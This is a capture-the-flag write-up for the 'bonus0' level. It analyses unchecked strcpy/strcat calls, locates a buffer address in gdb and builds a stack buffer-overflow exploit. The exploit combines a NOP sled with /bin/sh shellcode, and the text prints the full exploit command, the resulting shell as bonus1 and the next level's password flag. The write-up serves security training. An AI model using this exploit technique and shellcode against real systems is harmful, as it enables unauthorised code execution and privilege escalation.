### Download binary
``scp -P4242 bonus0@192.168.31.170:/home/user/bonus0/bonus0 ~/Desktop/``

----

### Decompilation with ghidra
We disasemble the main, to search for a breach.

----

### Main function analysis (see sources)

**Main function :**
char	buffer[54];
Call : pp(buffer);
Then : puts(buffer);

**PP function :**
char	first_line [20];
char	second_line [20];
Call : p function x2 (first line and second line)
Call : strcpy, without checking the size !
Try to replace '\0' by space
Call : strcat without checking the size !

**P function :**
Replace '\n' by '\0', and if there's no '\n' ?

**Tests :**
If we respect the size of the inputs (20)
``./bonus0``
> -

``AAAAAAAAAAAAAAAAAAA``
> -

``BBBBBBBBBBBBBBBBBBB``
>AAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBB

If we exceed the size of the inputs by 1 (21), we override the '\0' of arg1, so we end up with arg1 + arg2 + memory residue + arg2 + memory residue
``./bonus0``
> -

``AAAAAAAAAAAAAAAAAAAA``
> -

``BBBBBBBBBBBBBBBBBBBB``
>AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB��� BBBBBBBBBBBBBBBBBBBB���


### Finding the global buffer address

**We analyze the call to read :**
read([**file descriptor**], [**buffer pointer**], [**size max to read**])

``(gdb) disas p``
>[...]
   0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
   0x080484c8 <+20>:	movl   $0x1000,0x8(%esp)		// size 0x1000 = 4096
   0x080484d0 <+28>:	lea    -0x1008(%ebp),%eax		// calculates the address of the buffer and stores it in the %eax register
   0x080484d6 <+34>:	mov    %eax,0x4(%esp)			// then moves this address onto the stack
   0x080484da <+38>:	movl   $0x0,(%esp)				// file descriptor 0
   0x080484e1 <+45>:	call   0x8048380 <read@plt>

``(gdb) b *0x080484d6``
>Breakpoint 1 at 0x080484d6

``(gdb) run``
>Starting program: /home/user/bonus0/bonus0
 -
Breakpoint 1, 0x080484d6 in p ()

``(gdb) i r``
>eax            0xbfffe670	-1073748368

**0xbfffe670 -> global buffer address**

----

### Building the payload

The same shellcode as level 2 is used : https://shell-storm.org/shellcode/files/shellcode-811.html
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80


**1st input :**
NOP * 1000 (slide for shellcode) + SHELLCODE
python -c "print '\x90' * 1000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"

**2nd input**
Analyzing the behavior of memory :
input1 -> **20 bytes**
input2 -> **20 bytes**
Both are concatenated into a buffer of **54 bytes**
20 + 20 + 1 ('/0' added by strcat) = **41 bytes filled out of 54.**
We add **9 filling chars to reach 50**.
We **add the address we want to point to** (somewhere in the middle of the NOPs that serve as a slide to our shellcode).
-> Address in the middle of the NOPs (buffer start 0xbfffe670 -> 500 bytes further): **0xbfffe864**
We fill the rest of our buffer, with **7 filling characters, to correctly override the return address**

----

#### Getting the flag

``(python -c "print '\x90' * 1000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"; python -c "print '\x90' * 9 + '\x64\xe8\xff\xbf' + '\x90' * 7"; cat) | ./bonus0``
> -
 -
�����������������������������d������������� ���������d�������������

``whoami``
>bonus1

``cat /home/user/bonus1/.pass``
>cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
